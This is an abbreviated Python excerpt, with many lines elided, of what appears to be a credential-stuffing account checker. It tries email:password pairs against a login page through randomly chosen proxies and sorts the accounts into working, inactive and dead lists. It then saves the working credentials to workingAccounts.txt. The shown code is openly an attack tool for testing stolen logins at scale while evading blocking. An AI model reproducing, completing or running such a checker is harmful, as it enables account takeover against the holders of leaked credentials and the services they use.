...
def testAccount(email,password,typeProxy):
            ...
            while 'Sorry, we are unable to process your request.' in page:
                        try:
                                    proxies("Default")
                                    ...
                                    if (response.code == 200):
                                                ...
                                                if (page.find('Sorry, we are unable to process your request.') != -1):
                                                            ...
                                                            br.open(logoutURL)
                                                            working.append(f'{email}:{password}' + '\n')
                                                elif (page.find('Finish Sign-up') != -1):
                                                            br.open(logoutURL)
                                                            notActive.append(f'{email}:{password}')
                                                ...
                                                print(f'Error: {str(response.code)} Trying again.')
...
def writeToFile():
            ...
            with open('workingAccounts.txt', 'w+') as workingAccounts:
            ...
            print(f'Inactive Accounts: {len(notActive)}')
            print(f'Dead accounts: {len(dead)}')
            print ('')
...
def proxies(country):
            ...
            if (path.exists(proxyFile) and path.getsize(proxyFile) > 0):
                        ...
                        with open(proxyFile, "r") as filestream:
                                    randomProxyID = randint(0, sum(1 for _ in lines) - 1)
...
def main():   
            ...
            try:
                        ...
                        if (path.exists(accounts) and path.getsize(accounts) > 0):
                                    progress = 0
                                    maxValue = sum(1 for _ in open(accounts))
